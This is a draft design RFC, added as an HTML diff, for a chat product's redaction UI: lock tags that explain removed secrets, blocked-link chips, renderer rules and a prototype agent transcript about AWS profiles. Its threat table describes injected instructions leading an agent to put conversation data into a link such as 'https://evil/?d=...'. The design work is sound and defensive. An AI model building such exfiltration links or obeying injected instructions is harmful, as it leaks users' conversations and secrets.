@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RFC · Redaction that explains itself — problem, fix, UI prototype</title>
+<style>
+:root{--rx-bg:var(--bg,#12141a);--rx-text:var(--text,#e4e4e7);--rx-card:var(--card,#181b22);--rx-card-fg:var(--card-fg,#f4f4f5);--rx-border:var(--border,#2a2e39);--rx-border-strong:var(--border-strong,#3a3f4d);--rx-accent:var(--accent,#7aa2f7);--rx-accent-subtle:var(--accent-subtle,rgba(122,162,247,.16));--rx-muted:var(--muted,#8b93a7);--rx-muted-strong:var(--muted-strong,#aab2c5);--rx-danger:var(--danger,#f0616d);--rx-danger-subtle:var(--danger-subtle,rgba(240,97,109,.14));--rx-warn:var(--warn,#e8b04b);--rx-warn-subtle:var(--warn-subtle,rgba(232,176,75,.14));--rx-info:var(--info,#5aa9e6);--rx-info-subtle:rgba(90,169,230,.14);--rx-ok:var(--ok,#5cc489);--rx-ok-subtle:rgba(92,196,137,.14);--rx-bg-elevated:var(--bg-elevated,#1a1d25);--rx-bg-hover:var(--bg-hover,#262a35)}
+*{box-sizing:border-box}
+html,body{margin:0;background:var(--rx-bg);color:var(--rx-text);font-family:ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;font-size:14px;line-height:1.65}
+.mono,code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+code{font-size:.92em;background:var(--rx-bg-elevated);border:1px solid var(--rx-border);border-radius:4px;padding:0 4px}
+a{color:var(--rx-accent);text-decoration:none;cursor:pointer}
+button{font-family:inherit}
+:focus-visible{outline:2px solid var(--rx-accent);outline-offset:2px;border-radius:4px}
+.wrap{max-width:860px;margin:0 auto;padding:28px 20px 60px}
+h1{font-size:24px;line-height:1.3;margin:0 0 6px}
+h2{font-size:17px;margin:34px 0 10px;padding-top:14px;border-top:1px solid var(--rx-border)}
+h3{font-size:14.5px;margin:20px 0 6px}
+p{margin:0 0 10px}
+ul,ol{margin:0 0 10px;padding-left:22px}
+li{margin:2px 0}
+.sub{color:var(--rx-muted);font-size:13px}
+.meta{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0 0;font-size:12px;color:var(--rx-muted)}
+.tag{border:1px solid var(--rx-border);border-radius:999px;padding:1px 9px}
+.tag.draft{border-color:var(--rx-warn);color:var(--rx-warn)}
+blockquote{margin:8px 0 12px;padding:8px 12px;border-left:3px solid var(--rx-border);background:var(--rx-bg-elevated);color:var(--rx-muted-strong);font-size:13px}
+table{width:100%;border-collapse:collapse;font-size:13px;margin:8px 0 12px}
+th,td{border:1px solid var(--rx-border);padding:6px 9px;text-align:left;vertical-align:top}
+th{background:var(--rx-bg-elevated)}
+td.no{color:var(--rx-danger)}
+.fact{border:1px solid var(--rx-border);border-left:3px solid var(--rx-info);border-radius:8px;padding:10px 12px;background:var(--rx-bg-elevated);margin:8px 0}
+.fact b{color:var(--rx-text)}
+.callout{border:1px solid var(--rx-border);border-radius:10px;padding:10px 12px;background:var(--rx-card);color:var(--rx-card-fg);margin:10px 0}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media (max-width:700px){.grid2{grid-template-columns:1fr}}
+.toc{display:flex;gap:6px;flex-wrap:wrap;margin:14px 0 0;font-size:12px}
+.toc a{border:1px solid var(--rx-border);border-radius:999px;padding:2px 10px;color:var(--rx-muted-strong)}
+.tbl{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:8px 0 12px}
+.tbl table{margin:0}
+
+/* ===== prototype controls (NOT part of the chat) ===== */
+.proto{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin:14px 0 0;padding:8px 12px;border:1px dashed var(--rx-border-strong);border-radius:10px 10px 0 0;background:var(--rx-bg-elevated);font-size:12px;color:var(--rx-muted)}
+.proto .lab{font-weight:600;color:var(--rx-muted-strong);text-transform:uppercase;letter-spacing:.04em;font-size:11px}
+.seg{display:inline-flex;border:1px solid var(--rx-border);border-radius:8px;overflow:hidden}
+.seg button{border:0;background:transparent;color:var(--rx-muted);padding:5px 10px;font-size:12px;cursor:pointer;border-right:1px solid var(--rx-border);min-height:28px}
+.seg button:last-child{border-right:0}
+.seg button[aria-pressed="true"]{background:var(--rx-accent-subtle);color:var(--rx-text)}
+.seg button:focus-visible{outline-offset:-2px;border-radius:0}
+
+/* ===== demo: real chat layout ===== */
+.demo{border:1px solid var(--rx-border);border-top:0;border-radius:0 0 14px 14px;overflow:hidden;background:var(--rx-bg);margin:0 0 8px}
+.topbar{display:flex;align-items:center;gap:8px;padding:8px 14px;border-bottom:1px solid var(--rx-border);background:var(--rx-bg-elevated);font-size:12px;line-height:16px;color:var(--rx-muted)}
+.topbar .title{color:var(--rx-text);font-weight:600;font-size:13px}
+.transcript{max-width:900px;margin:0 auto;padding:12px 16px 16px;display:flex;flex-direction:column}
+.transcript > *{padding:4px 0}
+.u{display:flex;flex-direction:column;align-items:flex-end}
+.u .bubble{border-radius:12px;background:var(--rx-card);color:var(--rx-card-fg);padding:8px 16px;max-width:min(550px,100%);width:fit-content;font-size:14px;line-height:24px}
+.a{color:var(--rx-text);font-size:14px;line-height:24px}
+.a p{margin:0 0 8px}
+.a :not(pre)>code{background:rgba(0,0,0,.15);border:0;padding:.15em .4em;border-radius:4px;font-size:.9em;overflow-wrap:break-word;word-break:break-all}
+.stats{display:flex;align-items:center;gap:4px;margin-top:4px;font-size:11px;line-height:16px;color:var(--rx-muted);opacity:.6;font-variant-numeric:tabular-nums}
+.acts{display:flex;align-items:center;gap:0;margin-top:4px;opacity:0;transition:opacity .3s .1s}
+.a:hover .acts,.a:focus-within .acts{opacity:1;transition-delay:.3s}
+.acts .ts{color:var(--rx-muted);font-size:12px;line-height:20px;margin-right:8px;font-variant-numeric:tabular-nums}
+.ab{width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;border:0;background:transparent;color:var(--rx-muted);border-radius:6px;cursor:pointer;padding:0}
+.ab:hover{color:var(--rx-text);background:var(--rx-bg-hover)}
+.ab svg{width:14px;height:14px}
+.cb{border-radius:12px;border:1px solid var(--rx-border);background:var(--rx-bg-elevated);overflow:hidden;margin:8px 0}
+.cb .hd{display:flex;align-items:center;justify-content:space-between;padding:4px 4px 4px 12px;color:var(--rx-muted);font-size:13px;min-height:28px}
+.cb .cpy{opacity:0;transition:opacity .15s}
+.cb:hover .cpy,.cb:focus-within .cpy{opacity:1}
+.cb pre{margin:0;padding:8px 12px;font-size:13px;line-height:20px;white-space:pre;overflow-x:auto;color:var(--rx-text)}
+.cb pre.prose{white-space:pre-wrap;word-break:break-all}
+.ico{width:14px;height:14px;display:inline-block;vertical-align:-2px}
+/* tool / thinking rows */
+.trow{display:flex;width:fit-content;align-items:flex-start;gap:8px;max-width:100%;min-width:0;margin-left:-8px;padding:2px 8px;border:0;border-radius:6px;background:transparent;font-size:13px;line-height:20px;color:var(--rx-muted);cursor:pointer;transition:color .15s;text-align:left}
+.trow:hover{color:var(--rx-text)}
+.trow .lbl{min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.trow[aria-expanded="true"] .lbl{white-space:normal;overflow-wrap:anywhere}
+.pi{width:12px;height:12px;flex:none;margin-top:4px}
+.pi.ok{color:var(--rx-ok)}
+.pi.acc{color:var(--rx-accent)}
+.trow .chev{transition:transform .15s}
+.trow[aria-expanded="true"] .chev{transform:rotate(90deg)}
+.trow .fchip{display:inline-flex;align-items:center;gap:4px;margin-left:8px;padding:2px 6px;border-radius:4px;font-family:ui-monospace,monospace;font-size:12px;line-height:20px;background:var(--rx-bg-hover);color:var(--rx-muted)}
+.trow .fchip .pi{margin-top:0}
+.rail{margin:4px 0 8px 4px;padding-left:12px;border-left:2px solid var(--rx-ok);font-size:12px;line-height:18px;color:var(--rx-muted)}
+.rail pre{margin:4px 0 0;padding:6px 8px;border-radius:6px;background:var(--rx-bg-hover);color:var(--rx-text);white-space:pre;overflow-x:auto;font-size:12px;line-height:18px}
+/* redaction primitives — routine protection is NEUTRAL (info blue), never danger red */
+.rc{position:relative;display:inline-flex;align-items:center;gap:4px;border-radius:5px;padding:0 6px;font-size:11px;line-height:16px;min-height:18px;font-family:ui-sans-serif,system-ui,sans-serif;vertical-align:-1px;cursor:pointer;border:1px solid var(--rx-info);background:var(--rx-info-subtle);color:var(--rx-card-fg);white-space:nowrap}
+.rc .q{color:var(--rx-muted)}
+.rc:hover{background:var(--rx-bg-hover)}
+.blk{display:inline-flex;align-items:center;gap:6px;flex-wrap:wrap;border:1px dashed var(--rx-warn);background:var(--rx-warn-subtle);border-radius:8px;padding:2px 6px 2px 8px;font-size:12px;line-height:20px;color:var(--rx-card-fg);vertical-align:middle;cursor:help;max-width:100%}
+.blk .tagb{font-size:10px;font-weight:700;letter-spacing:.04em;color:var(--rx-warn)}
+.blk .host{font-family:ui-monospace,monospace;font-size:12px;color:var(--rx-card-fg)}
+.blk .q{color:var(--rx-muted)}
+.blk .ins{position:relative;border:1px solid var(--rx-warn);background:transparent;color:var(--rx-card-fg);border-radius:5px;padding:0 6px;font-size:11px;line-height:16px;min-height:18px;cursor:pointer}
+.blk .ins:hover{background:var(--rx-bg-hover)}
+.pill{border:1px solid var(--rx-border);border-radius:999px;padding:0 7px;font-size:11px;line-height:16px;color:var(--rx-muted-strong);white-space:nowrap;display:inline-block}
+.btn{border:1px solid var(--rx-border);background:var(--rx-card);color:var(--rx-card-fg);border-radius:6px;padding:3px 10px;font-size:12px;line-height:18px;min-height:28px;cursor:pointer;white-space:nowrap}
+.btn:hover{border-color:var(--rx-border-strong);background:var(--rx-bg-hover)}
+.btn.pri{border-color:var(--rx-accent);background:var(--rx-accent-subtle)}
+.btn.warn{border-color:var(--rx-warn)}
+.btn.ghost{border-color:transparent;background:transparent;color:var(--rx-muted)}
+.btn[disabled]{opacity:.7;cursor:default}
+.lnk{background:none;border:0;padding:4px 2px;color:var(--rx-accent);font-size:inherit;cursor:pointer;min-height:24px;text-align:left}
+.pop{position:relative;border:1px solid var(--rx-border);border-radius:12px;background:var(--rx-bg-elevated);color:var(--rx-card-fg);padding:12px;margin:8px 0;max-width:560px;box-shadow:0 8px 24px rgba(0,0,0,.28);font-size:13px;line-height:20px}
+.pop h4{margin:0 28px 2px 0;font-size:13px;font-weight:600}
+.pop .x{position:absolute;top:6px;right:6px;width:28px;height:28px;border:0;background:transparent;color:var(--rx-muted);border-radius:6px;cursor:pointer;font-size:16px;line-height:1}
+.pop .x:hover{color:var(--rx-text);background:var(--rx-bg-hover)}
+.src{font-size:13px;line-height:20px;color:var(--rx-card-fg);margin:4px 0 8px}
+.src code{font-size:12px}
+.act{display:flex;justify-content:space-between;align-items:center;gap:10px;border:1px solid var(--rx-border);border-radius:8px;padding:6px 8px;background:var(--rx-card);color:var(--rx-card-fg);margin-top:6px;font-size:12px;line-height:18px}
+.act code{font-size:12px;color:var(--rx-muted-strong);background:transparent;border:0;padding:0}
+.act .note{color:var(--rx-muted);font-size:11px}
+.fbline{display:flex;align-items:center;gap:8px;margin-top:6px;padding:6px 8px;border-radius:8px;background:var(--rx-ok-subtle);border:1px solid var(--rx-ok);color:var(--rx-card-fg);font-size:12px;line-height:18px}
+.banner{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin:8px 0;padding:8px 10px;border-radius:8px;background:var(--rx-ok-subtle);border:1px solid var(--rx-ok);color:var(--rx-card-fg);font-size:12px;line-height:18px;max-width:560px}
+.disc{margin-top:8px;border-top:1px solid var(--rx-border);padding-top:2px}
+.disc summary{list-style:none;display:flex;align-items:center;gap:6px;color:var(--rx-muted);font-size:12px;line-height:18px;min-height:28px;cursor:pointer;user-select:none}
+.disc summary::-webkit-details-marker{display:none}
+.disc summary::before{content:"▸";transition:transform .15s;font-size:10px}
+.disc[open] summary::before{transform:rotate(90deg)}
+.disc summary:hover{color:var(--rx-text)}
+.disc .body{padding:2px 0 4px;font-size:13px;line-height:20px;color:var(--rx-card-fg)}
+.foot{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-top:8px;font-size:11px;line-height:16px;color:var(--rx-muted);flex-wrap:wrap}
+.foot .lnk{font-size:11px}
+.hidden{display:none}
+.confirm{border:1px solid var(--rx-border);border-radius:8px;background:var(--rx-bg);padding:10px;margin-top:8px;font-size:12px;line-height:18px}
+.confirm .row2{display:flex;gap:8px;margin-top:8px;flex-wrap:wrap}
+.strip{display:flex;align-items:center;gap:8px;border:1px solid var(--rx-border);border-radius:8px;background:var(--rx-bg-elevated);padding:4px 10px;font-size:12px;line-height:18px;color:var(--rx-muted-strong);margin:0 0 8px;flex-wrap:wrap}
+.drawer{border:1px solid var(--rx-border);border-radius:12px;background:var(--rx-bg-elevated);color:var(--rx-card-fg);padding:12px;margin:8px 0;font-size:13px;line-height:20px}
+.row{display:grid;grid-template-columns:28px 1fr auto;gap:10px;align-items:center;padding:8px 0;border-top:1px solid var(--rx-border)}
+.row.first{border-top:none}
+.num{width:22px;height:22px;border-radius:50%;background:var(--rx-info-subtle);border:1px solid var(--rx-info);color:var(--rx-card-fg);font-size:11px;line-height:1;display:inline-flex;align-items:center;justify-content:center;vertical-align:middle;cursor:pointer;font-family:ui-sans-serif,system-ui,sans-serif;padding:0;position:relative}
+.num:hover{background:var(--rx-bg-hover)}
+.coach{border:1px solid var(--rx-info);border-radius:12px;background:var(--rx-bg-elevated);color:var(--rx-card-fg);padding:12px;display:grid;grid-template-columns:auto 1fr;gap:10px;font-size:13px;line-height:20px;max-width:640px}
+.coach ol{margin:4px 0 0;padding-left:18px}
+.coach li{margin:2px 0}
+.glyph{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;border-radius:5px;background:var(--rx-info-subtle);border:1px solid var(--rx-info);color:var(--rx-card-fg);vertical-align:-1px;cursor:pointer;padding:0;position:relative}
+.glyph:hover{background:var(--rx-bg-hover)}
+mark{background:var(--rx-warn-subtle);color:var(--rx-card-fg);border-bottom:2px solid var(--rx-warn)}
+.gi{width:12px;height:12px;display:inline-block;vertical-align:-2px;flex:none}
+.glyph .gi{width:11px;height:11px;vertical-align:0}
+.coach .gi{width:22px;height:22px;color:var(--rx-info)}
+.strip .gi{width:14px;height:14px;color:var(--rx-info)}
+/* variant visibility: default A visible WITHOUT JS */
+.v{display:none}
+.v.on{display:block}
+span.v.on{display:inline}
+#backdrop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:50;border:0;padding:0;margin:0;width:100%}
+@media (hover:none){
+  .ab{width:44px;height:36px}.ab svg{width:16px;height:16px}
+  .acts,.cb .cpy{opacity:1}
+  .btn,.lnk,.disc summary,.trow{min-height:44px}
+  .btn{display:inline-flex;align-items:center;justify-content:center}
+  .pop .x{width:44px;height:44px}
+  /* inline markers keep their visual size but get a 44pt hit area */
+  .num::after{content:"";position:absolute;inset:-11px}
+  .rc::after,.glyph::after,.blk .ins::after{content:"";position:absolute;inset:-13px}
+}
+@media (max-width:640px){
+  .wrap{padding:20px 14px 48px}
+  h1{font-size:21px}
+  h2{font-size:16px;margin-top:28px}
+  .toc a{padding:4px 10px}
+  .tbl table{min-width:560px}
+  .tbl.wide table{min-width:720px}
+  .proto{padding:8px 10px}
+  .seg{width:100%;display:grid;grid-template-columns:1fr 1fr;border-radius:10px}
+  .seg button{border-right:0;border-bottom:1px solid var(--rx-border);padding:9px 8px;min-height:44px;text-align:center;line-height:1.3}
+  .seg button:nth-child(odd){border-right:1px solid var(--rx-border)}
+  .seg button:nth-child(n+3){border-bottom:0}
+  .transcript{padding:10px 12px 14px}
+  .topbar{padding:8px 12px}
+  .cb pre{font-size:12.5px}
+  .rc{white-space:normal;line-height:16px;padding:1px 6px;max-width:100%;flex-wrap:wrap}
+  /* cards become bottom sheets */
+  .pop{position:fixed;left:0;right:0;bottom:0;top:auto;margin:0;max-width:none;max-height:78vh;overflow-y:auto;border-radius:16px 16px 0 0;z-index:60;padding:12px 14px calc(14px + env(safe-area-inset-bottom,0px));box-shadow:0 -8px 32px rgba(0,0,0,.5)}
+  .pop .x{position:sticky;top:0;float:right;background:var(--rx-bg-elevated)}
+  body.pop-open #backdrop{display:block}
+  .act{flex-direction:column;align-items:stretch;gap:6px}
+  .act .btn{width:100%;min-height:44px}
+  .act code{word-break:break-all;white-space:normal}
+  .btn{min-height:44px;padding:6px 10px}
+  .row{grid-template-columns:28px 1fr}
+  .row > div:last-child{grid-column:2;display:flex;flex-wrap:wrap}
+  .row .btn{flex:1}
+  .foot{flex-direction:column;align-items:stretch;gap:2px}
+  .foot .lnk{min-height:44px;display:flex;align-items:center}
+  .strip{padding:6px 10px}
+  .strip > .lnk{flex-basis:100%}
+  .coach{grid-template-columns:1fr}
+  .coach > div:first-child{display:none}
+  .stats{flex-wrap:wrap}
+}
+</style>
+</head>
+<body>
+<button id="backdrop" tabindex="-1" aria-hidden="true"></button>
+<div class="wrap">
+
+<h1>Redaction that explains itself</h1>
+<div class="sub">Explain why text was removed, where the original usually remains, and how to view it. Keep suspicious links visible, but prevent them from opening automatically.</div>
+<div class="meta"><span class="tag draft">draft</span><span class="tag">2026-09-15</span><span class="tag">rayrayxu</span><span class="tag">related: #8426 · #3056 · #674 · sidebar-preview loop-stall fix (PR pending push)</span></div>
+<div class="toc"><a href="#problem">Problem</a><a href="#facts">Three facts</a><a href="#threat">What we defend against</a><a href="#solution">The fix</a><a href="#demo">UI prototype</a><a href="#keep">What does not change</a><a href="#rollout">Rollout</a><a href="#open">Open questions</a></div>
+
+<h2 id="problem">Problem</h2>
+<p>When an agent's reply contains a secret (a private value such as an access key) or a link that may send out conversation data, redaction (replacing risky text with a placeholder before the message is saved) changes what appears in chat. The user sees <code>[REDACTED: credential]</code>, <code>[REDACTED: suspicious URL to wiki.corp.example]</code>, and this notice:</p>
+<blockquote>Security notice: 4 credentials in this message were replaced with a redaction placeholder before it reached this page. Any command shown above will not work if you paste it as-is; supply the secret yourself on the machine where you run it.</blockquote>
+<ol>
+  <li><b>It does not explain why.</b> The message says what was removed, but not why the system removed it, so users may think the product failed or look for a setting that does not exist.</li>
+  <li><b>It does not explain the next step.</b> The original value is no longer in the saved conversation, but the message does not say where it may still exist or how the user can view it.</li>
+  <li><b>The placeholder does nothing.</b> Users cannot select it to learn what happened, where the value came from, or what to do next.</li>
+  <li><b>The whole link disappears.</b> The system removes a link when its query, which is the part after the <code>?</code>, is over 200 characters. It can also mistake normal Chinese titles for suspicious text because seven Chinese characters can become 20 or more consecutive <code>%XX</code> groups when a URL encodes them.</li>
+  <li><b>It looks too serious.</b> Red warnings appear before the answer, even though this protection is working normally, so the explanation should look calm and follow the answer instead.</li>
+</ol>
+<p>Users repeatedly ask in Slack #kiro-crew-debug why text or links disappeared, which shows that the current message is confusing even when the protection worked correctly.</p>
+
+<h2 id="facts">Three facts to accept before changing anything</h2>
+<div class="fact"><b>1 · The value is not in the saved conversation.</b> The system replaces it <em>before</em> saving any message that was not written by the user (<code>chat_persistence._build_message_entry_uncached</code>). This means no saved copy of the conversation ever contains the value, so even the session owner cannot recover it from the conversation. The replacement also keeps the value out of Slack, artifacts, memory, sub-agents, and backups, although the source file, tool logs, model provider, or screenshots may still contain it. <b>There is no setting to turn this off.</b></div>
+<div class="fact"><b>2 · The value usually remains at its source.</b> Removing it from the saved conversation does not usually remove it from the file, command output, or environment variable where it came from. Because the user can already read that source, the UI should explain <em>where</em> it is and <em>how</em> to view it. The UI must also say when the source is no longer available, such as when temporary output has disappeared or a token has expired.</div>
+<div class="fact"><b>3 · The built-in Terminal does not remove live output.</b> Live command output goes straight to the browser, so users can view the source without leaving the dashboard. Redaction applies only when a user inserts selected Terminal text into chat (<code>api_terminal_redact</code>), and the live output otherwise remains visible only in the Terminal view.</div>
+
+<h2 id="threat">What we actually defend against</h2>
+<p>The design must handle three different ways data can leave the conversation, because each one requires a different protection:</p>
+<div class="tbl"><table>
+<tr><th style="width:26%">Risk</th><th>How data leaves</th><th>What stops it</th></tr>
+<tr><td><b>A secret appears in a saved or shared place</b> (Slack channel, artifact, log)</td><td>The secret itself is included in content that other people or systems can read.</td><td>Replace the secret before saving, so no saved conversation copy contains it. <b>Never weaken this rule.</b></td></tr>
+<tr><td><b>Harmful instructions make an agent put conversation data in a link</b></td><td>The agent creates a URL such as <code>https://evil/?d=&lt;your conversation&gt;</code>. Opening it, or Slack fetching a link preview automatically (an unfurl), sends the data to that site.</td><td>Show the URL as blocked text that is <b>unclickable and impossible to preview</b>. The URL does not need to be deleted.</td></tr>
+<tr><td><b>A request happens without anyone clicking</b> (a zero-click request): markdown images, Slack previews, widget frames</td><td>The code that displays the message requests the URL automatically for the user.</td><td>Never fetch an agent-written URL automatically, because hiding the URL without stopping the request adds no protection.</td></tr>
+</table></div>
+<p>Deleting a URL from the visible chat does not by itself stop data from leaving, because an agent may also use network access, file tools, or a shell. The real protection comes from limits on network access and from display code that never requests agent-written URLs automatically. The UI can therefore show a blocked link with an explanation and require confirmation before opening it, while secrets must still be replaced before saving.</p>
+
+<h2 id="solution">The fix</h2>
+
+<h3>0 · Task first, protection second</h3>
+<p>Redaction information must appear after the agent's answer. Show small neutral markers inside the answer, then any summary strip or coach card. The markers replace today's grey notice line — once they ship, the notice is removed, because it only repeated what the markers already say. Protection that worked normally uses the <b>info color, never danger red</b>, while red is reserved for a failure. Use a lock for a removed value, a shield for a summary, and a broken-link icon for a link that cannot open.</p>
+
+<h3>1 · The placeholder becomes a clickable tag with one shared card</h3>
+<p>Replace <code>[REDACTED: credential]</code> with a small, neutral lock tag that users can select. The tag opens one shared type of card, which leads with <b>three facts</b>:</p>
+<ul>
+  <li><b>Not saved</b> — the system removed the value before saving, so this page cannot show it and no setting can change that.</li>
+  <li><b>Source</b> — the card names the file and section, or the recorded command, where the value came from.</li>
+  <li><b>Recommended action</b> — <em>Open in Terminal</em> adds the exact command without running it, so the user can review it first and then view the unredacted live output. For a token that will expire soon, <em>Use the profile instead</em> avoids showing the token at all.</li>
+</ul>
+<p>Keep less common information closed until the user asks for it. <b>Technical details</b> explains which rule matched and exactly what the system protected. <b>More ways</b> offers Copy path and a pre-filled chat request that saves the value in a <code>0600</code> file, which only the owner's account can read; because this creates another secret copy on disk, the card must say so. A false-positive report sends only the rule name and session id, while the card clearly says when the source is gone. Each placeholder stores the rule and source for that specific removed value.</p>
+<p><b>Where the source comes from.</b> Redaction runs before the message is saved, while the original value and the tool results from that turn are still in memory. The system searches those results for the value and saves only a description of its source, never the value itself. If it finds the value in a file, it records the path and nearby section; if it finds the value in command output, it records the exact command that already ran, which the user can run again in the built-in Terminal to see the live output. Some known rules provide a fixed command instead; for example, an AWS secret-key match (<code>bare_aws_secret</code>) in <code>~/.aws/credentials [dev]</code> uses <code>aws configure get aws_secret_access_key --profile dev</code>. A fixed command can use only non-secret details such as a profile name. If no source matches, the card says that the source was not recorded. Every command added to Terminal must be either a command that already ran or a fixed template, never free text written by the agent.</p>
+
+<h3>2 · A one-time coach card on the first redaction in a session</h3>
+<p>Show this guidance once, <em>after</em> the first answer that contains a removed value. It should explain that the values were replaced before saving, so no saved conversation copy contains them, Kiro Crew cannot show them, and no setting can change this behavior. It should also explain that each lock tag names the likely source and tells the user how to view it. End with: "Keep secrets at their source. Your messages are saved exactly as typed." Keep extra details under "Learn more", and after the user selects "Got it", show only the small lock tag.</p>
+
+<h3>3 · Suspicious links: blocked, but visible</h3>
+<p>Keep a suspicious URL visible as a <b>Blocked link</b> chip, but do not make it clickable. Show the site name and path immediately, while hiding the query until the user selects <em>See link</em>. The details card explains why the link was blocked and can show the full URL, while <em>Copy URL</em> copies it without opening it. <em>Open once</em> requires confirmation, with <b>Cancel</b> selected by default, and the confirmation names both the site and the query that will be sent. <em>Allow long queries for this host in this workspace</em> creates a rule for only that workspace. The dashboard writes this rule and an agent can never write it. The rule relaxes only checks for long queries and base64 text, which is a common encoding that turns data into letters and numbers; all credential checks remain active. Users can undo the choice immediately or revoke it later in Settings. Never describe the link as safe. On shared pages, hide only the suspicious query value and do not provide an Open button.</p>
+
+<h3>4 · Every action answers back</h3>
+<p>Every action must tell the user what happened, so <em>Copy</em> shows "Copied" and <em>Open in Terminal</em> says that the command was added but not run, with a <em>Clear</em> action beside it. <em>Pre-fill request</em> reminds the user to review the text before sending, reports say exactly what information was sent, and <em>Allow</em> explains where the new rule applies before offering Undo. Users can always cancel <em>Open once</em>. On phones, cards open from the bottom of the screen with Close always visible; tapping outside the card or pressing Esc closes it, then restores the user's previous focus and scroll position. Every control must provide a touch target of at least 44×44 points.</p>
+
+<h3>5 · Three renderer rules, independent of any UI</h3>
+<ul>
+  <li>Do not load an image from agent-written markdown automatically; wait until the user selects it.</li>
+  <li>The browser policy for an embedded widget frame, called a Content Security Policy, blocks images and frames from other sites.</li>
+  <li>Slack bot posts must never fetch link or media previews automatically (<code>unfurl_links=false, unfurl_media=false</code>).</li>
+</ul>
+<p>These three rules provide the protection by stopping URL requests that would otherwise happen without a click, so they must be in place before adding the UI changes that explain blocked links.</p>
+
+<h3>6 · Two false-positive sources fixed on the way</h3>
+<ul>
+  <li>Decode percent-encoded text, where each encoded character appears as one or more <code>%XX</code> groups, before deciding whether it is suspicious. Normal CJK text and emoji should remain readable instead of being blocked; today, only seven Chinese characters can trigger this rule, making it the largest known false positive for Chinese-speaking users.</li>
+  <li>In the internal edition, exempt the exact hosts <code>wiki.corp.example</code>, <code>code.corp.example</code>, and <code>docs.corp.example</code> from only the long-query and base64 checks (<code>exempt_exact_hosts</code>). Secret checks still apply, and the existing extension point means this change does not require an upstream code change.</li>
+</ul>
+
+<h2 id="demo">UI prototype · real chat layout</h2>
+<p class="sub">This prototype shows how one conversation would look in the current chat layout. The agent's answer comes first, with neutral blue markers wherever content was removed, and the summary or first-time guidance follows it. Each details card begins with the same three facts: the value was not saved, where its source is, and what the user can do next. Copy, Open in Terminal, Allow, and Open once all confirm what happened, while Cancel remains the default choice. On screens up to 640px wide, cards open from the bottom, and every control has a touch target of at least 44 points. The dashed bar is a <b>prototype control</b>, not part of the product UI.</p>
+
+<div class="proto" role="group" aria-label="Prototype variant">
+  <span class="lab">Prototype variant</span>
+  <div class="seg" id="seg">
+    <button type="button" data-v="a" aria-pressed="true">A Inline chip</button><button type="button" data-v="b" aria-pressed="false">B Shield strip + drawer</button><button type="button" data-v="d" aria-pressed="false">C First-run coach</button>
+  </div>
+</div>
+<div class="demo" id="rx">
+<div class="topbar">
+  <span class="title">aws-setup</span><span class="model">· kirocrew · claude-fable-5.1</span>
+</div>
+<div class="transcript">
+  <div class="u"><div class="bubble">Check whether my dev AWS profile is set up right, and give me the link to that reviewers filter page.</div></div>
+  <div class="a">
+    <button type="button" class="trow" aria-expanded="false" aria-controls="rail-think"><svg class="pi acc" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9.9 3.6 11 8l4.4 1.1L11 10.2 9.9 14.6 8.8 10.2 4.4 9.1 8.8 8z"/><path d="M18 14l.7 2.3L21 17l-2.3.7L18 20l-.7-2.3L15 17l2.3-.7z"/></svg><span class="lbl">Thought process</span><svg class="pi chev" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg></button>
+    <div id="rail-think" class="rail hidden" style="border-left-color:var(--rx-accent)">Read the two profiles from <code>~/.aws/credentials</code>, confirm region, then hand back the filter URL the user asked for.</div>
+    <button type="button" class="trow" aria-expanded="false" aria-controls="rail-t1"><svg class="pi ok" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="1"/></svg><span class="lbl">Check whether the dev AWS profile is configured</span></button>
+    <div id="rail-t1" class="rail hidden"><span class="pill">shell</span> <span class="pill">11:24:03</span><pre>aws configure list --profile dev</pre></div>
+    <button type="button" class="trow" aria-expanded="false" aria-controls="rail-t2"><svg class="pi ok" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="1"/></svg><span class="lbl">Read</span><span class="fchip">credentials<svg class="pi" aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="15" y1="3" x2="15" y2="21"/></svg></span></button>
+    <div id="rail-t2" class="rail hidden"><span class="pill">read</span> <span class="pill">11:24:04</span><pre>~/.aws/credentials</pre></div>
+
+    <p><b>Your dev profile is set up correctly.</b> Region is <code>us-west-2</code>; <code>~/.aws/credentials</code> has complete key pairs for both profiles, and dev also carries a session token (it expires):</p>
+
+    <div class="cb"><div class="hd"><span class="mono">ini</span><button type="button" class="ab cpy" data-fb="Copied" aria-label="Copy code"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button></div>
+<pre>[default]
+aws_access_key_id<wbr> = AKIA…EXAMPLE
